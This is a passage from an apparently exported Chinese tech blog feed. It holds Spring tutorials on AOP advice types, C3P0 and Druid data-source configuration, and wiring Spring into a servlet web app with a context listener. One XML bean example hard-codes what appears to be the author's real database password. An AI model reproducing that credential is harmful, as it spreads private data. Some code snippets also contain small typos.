class="string">&quot;环绕后通知......&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">	target.method(<span class="number">666</span>, <span class="string">&quot;大威天龙&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155005.png"></p>
<hr>
<h2 id="2-获取切入点方法返回值"><a href="#2-获取切入点方法返回值" class="headerlink" title="2. 获取切入点方法返回值"></a>2. 获取切入点方法返回值</h2><p><strong>后置通知（after-returning）：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置后置通知获取原始方法的返回值，要求returning属性与方法形参相同</span></span><br><span class="line"><span class="meta">@AfterReturning(value = &quot;myPointcut()&quot;, returning = &quot;ret&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">(JoinPoint joinPoint, Object ret)</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;ret = &quot;</span> + ret);</span><br><span class="line">	System.out.println(<span class="string">&quot;后置通知......&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155005.png"></p>
<p><strong>环绕通知（around）：</strong><br>环绕通知中可以手工书写对原始方法的调用，得到的结果即为原始方法的返回值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;myPointcut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint proceedingJoinPoint)</span> &#123;</span><br><span class="line">	<span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> proceedingJoinPoint.proceed（）;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-获取切入点方法运行异常信息"><a href="#3-获取切入点方法运行异常信息" class="headerlink" title="3. 获取切入点方法运行异常信息"></a>3. 获取切入点方法运行异常信息</h2><p><strong>抛出异常通知（after-throwing）：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置抛出异常后通知获取原始方法运行时抛出的异常对象，要求throwing属性值必须与方法形参名相同</span></span><br><span class="line"><span class="meta">@AfterThrowing(value = &quot;myPointcut()&quot;, throwing = &quot;throwable&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterThrowing</span><span class="params">(JoinPoint joinPoint, Throwable throwable)</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;throwable = &quot;</span> + throwable);</span><br><span class="line">	System.out.println(<span class="string">&quot;异常抛出通知......&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155005.png"></p>
<p><strong>环绕通知（around）：</strong><br>抛出异常后通知可以获取切入点方法运行的异常信息，使用形参可以接收运行时抛出的异常对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;myPointcut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint proceedingJoinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">	<span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		result = proceedingJoinPoint.proceed();</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">		t.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring配置数据源</title>
    <url>/posts/6c2ee665.html</url>
    <content><![CDATA[<blockquote>
<ul>
<li><strong>数据源（连接池）是为提高程序性能出现的</strong></li>
<li><strong>事先实例化数据源，初始化部分连接资源</strong></li>
<li><strong>使用连接资源时从数据源中获取</strong></li>
<li><strong>使用完毕后将连接资源归还给数据源</strong></li>
</ul>
</blockquote>
<p><strong>常见数据源（连接池）：<code>DBCP、C3P0、BoneCP、Druid</code>等。<br>这里介绍<code>C3p0</code>与<code>Druid</code>在Spring中的配置。</strong></p>
<h1 id="一、-数据源配置步骤"><a href="#一、-数据源配置步骤" class="headerlink" title="一、 数据源配置步骤"></a>一、 数据源配置步骤</h1><blockquote>
<p><strong>① 导入数据源的坐标以及数据库驱动坐标</strong><br><strong>② 创建数据源对象</strong><br><strong>③ 设置数据源的基本连接数据</strong><br><strong>④ 使用数据源获取连接资源和归还连接资源</strong></p>
</blockquote>
<blockquote>
<p><strong>① 导入数据源的坐标以及数据库驱动坐标</strong></p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>并建立一个jdbc.properties文件，配置如下信息</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jdbc.driver=com.mysql.jdbc.Driver</span><br><span class="line">jdbc.url=jdbc:mysql://localhost:3306/test?characterEncoding=utf8</span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=****</span><br></pre></td></tr></table></figure>
<h1 id="二、C3P0数据源配置"><a href="#二、C3P0数据源配置" class="headerlink" title="二、C3P0数据源配置"></a>二、C3P0数据源配置</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 手动创建 C3P0 （不加载配置文件）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHandInit_c3p0</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="type">ComboPooledDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComboPooledDataSource</span>();</span><br><span class="line">	dataSource.setDriverClass(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">	dataSource.setJdbcUrl(<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis&quot;</span>);</span><br><span class="line">	dataSource.setUser(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">	dataSource.setPassword(<span class="string">&quot;****&quot;</span>);</span><br><span class="line">	<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">	connection.close();</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 手动创建 C3P0 （加载配置文件）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHandInit_c3p0_load</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 1. 读取配置文件</span></span><br><span class="line">	<span class="type">ResourceBundle</span> <span class="variable">rb</span> <span class="operator">=</span> ResourceBundle.getBundle(<span class="string">&quot;jdbc&quot;</span>);</span><br><span class="line">	<span class="comment">// 2. 创建数据源对象，设置连接参数</span></span><br><span class="line">	<span class="type">ComboPooledDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComboPooledDataSource</span>();</span><br><span class="line">	dataSource.setDriverClass(rb.getString(<span class="string">&quot;jdbc.driver&quot;</span>));</span><br><span class="line">	dataSource.setJdbcUrl(rb.getString(<span class="string">&quot;jdbc.url&quot;</span>));</span><br><span class="line">	dataSource.setUser(rb.getString(<span class="string">&quot;jdbc.username&quot;</span>));</span><br><span class="line">	dataSource.setPassword(rb.getString(<span class="string">&quot;jdbc.password&quot;</span>));</span><br><span class="line">	<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">	connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="三、Druid数据源配置"><a href="#三、Druid数据源配置" class="headerlink" title="三、Druid数据源配置"></a>三、Druid数据源配置</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 手动创建 Druid（不加载配置文件）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHandInit_druid</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="type">DruidDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">	dataSource.setDriverClassName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">	dataSource.setUrl(<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis&quot;</span>);</span><br><span class="line">	dataSource.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">	dataSource.setPassword(<span class="string">&quot;****&quot;</span>);</span><br><span class="line">	<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">	connection.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 手动创建 Druid （加载配置文件）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHandInit_druid_load</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="comment">// 1. 读取配置文件</span></span><br><span class="line">	<span class="type">ResourceBundle</span> <span class="variable">rb</span> <span class="operator">=</span> ResourceBundle.getBundle(<span class="string">&quot;jdbc&quot;</span>);</span><br><span class="line">	<span class="comment">// 2. 创建数据源对象，设置连接参数</span></span><br><span class="line">	<span class="type">DruidDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">	dataSource.setDriverClassName(rb.getString(<span class="string">&quot;jdbc.driver&quot;</span>));</span><br><span class="line">	dataSource.setUrl(rb.getString(<span class="string">&quot;jdbc.url&quot;</span>));</span><br><span class="line">	dataSource.setUsername(rb.getString(<span class="string">&quot;jdbc.username&quot;</span>));</span><br><span class="line">	dataSource.setPassword(rb.getString(<span class="string">&quot;jdbc.password&quot;</span>));</span><br><span class="line">	<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">	connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="四、Spring配置数据源"><a href="#四、Spring配置数据源" class="headerlink" title="四、Spring配置数据源"></a>四、Spring配置数据源</h1><h2 id="1-基于xml配置文件"><a href="#1-基于xml配置文件" class="headerlink" title="1. 基于xml配置文件"></a>1. 基于xml配置文件</h2><blockquote>
<p><strong>可以将DataSource的创建权交由Spring容器完成</strong></p>
</blockquote>
<p><strong>① 在Spring核心配置文件中创建相应数据源的Bean</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  使用context加载配置文件 不使用配置文件加载数据库信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  C3P0数据源--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;c3p0DataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tangyitao273169.&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  Druid数据源 使用配置文件加载数据库信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;druidDataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>② 使用Spring相关API加载数据源</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHandInit_dataSource_bean</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">	<span class="type">DataSource</span> <span class="variable">druidDataSource</span> <span class="operator">=</span> (DataSource) app.getBean(<span class="string">&quot;druidDataSource&quot;</span>);</span><br><span class="line">	<span class="type">DataSource</span> <span class="variable">c3p0DataSource</span> <span class="operator">=</span> (DataSource) app.getBean(<span class="string">&quot;c3p0DataSource&quot;</span>);</span><br><span class="line">	<span class="type">Connection</span> <span class="variable">druidConnection</span> <span class="operator">=</span> druidDataSource .getConnection();</span><br><span class="line">	<span class="type">Connection</span> <span class="variable">c3p0DruidConnection</span> <span class="operator">=</span> c3p0DataSource .getConnection();</span><br><span class="line">	druidConnection .close();</span><br><span class="line">	c3p0DruidConnection .close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-基于注解开发"><a href="#2-基于注解开发" class="headerlink" title="2. 基于注解开发"></a>2. 基于注解开发</h2><p><strong>① 在Spring配置类中定义获取数据源的方法，并加上<code>@Bean</code>标签</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.driver&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String driver;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加 Bean, 表示当前方法返回值为一个 Bean</span></span><br><span class="line">    <span class="meta">@Bean(&quot;druidDataSource&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">getDruidDataSource</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">DruidDataSource</span> <span class="variable">druidDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">        druidDataSource.setDriverClassName(driver);</span><br><span class="line">        druidDataSource.setUrl(url);</span><br><span class="line">        druidDataSource.setUsername(name);</span><br><span class="line">        druidDataSource.setPassword(password);</span><br><span class="line">        <span class="keyword">return</span> druidDataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加 Bean, 表示当前方法返回值为一个 Bean</span></span><br><span class="line">    <span class="meta">@Bean(&quot;c3p0DataSource&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">getC30pDataSource</span><span class="params">()</span> <span class="keyword">throws</span> PropertyVetoException &#123;</span><br><span class="line">        <span class="type">ComboPooledDataSource</span> <span class="variable">c3P0PooledDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComboPooledDataSource</span>();</span><br><span class="line">        c3P0PooledDataSource.setDriverClass(driver);</span><br><span class="line">        c3P0PooledDataSource.setJdbcUrl(url);</span><br><span class="line">        c3P0PooledDataSource.setUser(name);</span><br><span class="line">        c3P0PooledDataSource.setPassword(password);</span><br><span class="line">        <span class="keyword">return</span> c3P0PooledDataSource;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>② 使用Spring相关API加载数据源</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(SpringConfig.class);</span><br><span class="line">	<span class="type">DataSource</span> <span class="variable">druidDataSource</span> <span class="operator">=</span> (DataSource) app.getBean(<span class="string">&quot;druidDataSource&quot;</span>);</span><br><span class="line">	<span class="type">DataSource</span> <span class="variable">c3p0DataSource</span> <span class="operator">=</span> (DataSource) app.getBean(<span class="string">&quot;c3p0DataSource&quot;</span>);</span><br><span class="line">	<span class="type">Connection</span> <span class="variable">druidConnection</span> <span class="operator">=</span> druidDataSource .getConnection();</span><br><span class="line">	<span class="type">Connection</span> <span class="variable">c3p0Connection</span> <span class="operator">=</span> c3p0DataSource.getConnection();</span><br><span class="line">	System.out.println(druidConnection);</span><br><span class="line">	System.out.println(c3p0Connection);</span><br><span class="line">	druidConnection .close();</span><br><span class="line">	c3p0Connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring集成Web环境</title>
    <url>/posts/94962b3f.html</url>
    <content><![CDATA[<h1 id="一、简单web环境搭建"><a href="#一、简单web环境搭建" class="headerlink" title="一、简单web环境搭建"></a>一、简单web环境搭建</h1><p><strong>主要思想是使用<a href="https://blog.csdn.net/qq_51938362/article/details/125703691?spm=1001.2014.3001.5501">Servlet</a>结合Spring完成一个小demo，话不多说，直接看代码。</strong><br><strong>① 定义好dao层与service层的相关代码，主要是实现userDaoImpl的<code>save()</code>方法</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154905.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;save....&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>② 定义一个Servlet</strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;UserServlet&quot;, value = &quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">		<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">		<span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> app.getBean(UserService.class);</span><br><span class="line">		userService.save();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">		<span class="built_in">this</span>.doGet(request, response);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>③ 项目启动，访问<code>http://localhost:8080/web/user</code></strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154905.png"><br><strong>运行成功。</strong></p>
<blockquote>
<ul>
<li><strong>项目缺点</strong>：<br>以上项目中，有一个问题就是在每次请求中都会创建一个<code>应用上下文对象</code>去加载Spring容器，这样会导致配置文件被多次加载，应用上下文创建多次，这是毫无意义的。</li>
</ul>
</blockquote>
<p>如何解决上述问题？最先想到的是使用<code>Java静态方法</code>。</p>
<h1 id="二、使用Java静态方法"><a href="#二、使用Java静态方法" class="headerlink" title="二、使用Java静态方法"></a>二、使用Java静态方法</h1><p><strong>① 新街一个工具类，提供静态方法返回<code>ApplicationContext</code>对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringContextUtil</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> ApplicationContext app;</span><br><span class="line">	<span class="keyword">static</span>&#123;</span><br><span class="line">		app = <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicatiopnContext.xml&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> ApplicationContext <span class="title function_">getApplicationContext</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> app;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>② 修改<code>Servlert</code>中<code>ApplicationContext</code>对象的获取方式</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> SpringContextUtil.getApplicationText();</span><br><span class="line">	<span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> app.getBean(UserService.class);</span><br><span class="line">	userService.save();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样做<code>应用上下文对象</code>只会创建一次，也达到了我们预期的完善目的。但是我们这是web项目，更高级的做法是使用<a href="https://blog.csdn.net/qq_51938362/article/details/125744243?spm=1001.2014.3001.5501">监听器</a>。当服务器一启动我们就创建<code>应用上下文</code>对象并将其存放在最大域<code>ServletContext</code>中，之后在每次请求都能拿到<code>ServletContext</code>的<code>应用上下文</code>对象，达到数据共享的目的。</p>
<h1 id="三、手动实现监听器"><a href="#三、手动实现监听器" class="headerlink" title="三、手动实现监听器"></a>三、手动实现监听器</h1><h2 id="1-使用监听器的基本步骤"><a href="#1-使用监听器的基本步骤" class="headerlink" title="1. 使用监听器的基本步骤"></a>1. 使用监听器的基本步骤</h2><p><strong>① 自定义监听器类并实现<code>ServletContextListener</code>类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextLoadListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        <span class="comment">// 加载Spring核心配置文件，获取 ApplicationContext 对象</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取 ServletContext 对象</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletContextEvent.getServletContext();</span><br><span class="line">        <span class="comment">// 将 应用上下文对象存放在 ServletContext域</span></span><br><span class="line">        servletContext.setAttribute(<span class="string">&quot;applicationContext&quot;</span>, app);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>② 在 web.xml配置监听器或直接使用注解</strong></p>
<ul>
<li>使用 web.xml配置<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.tyt.listener.ContextLoadListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
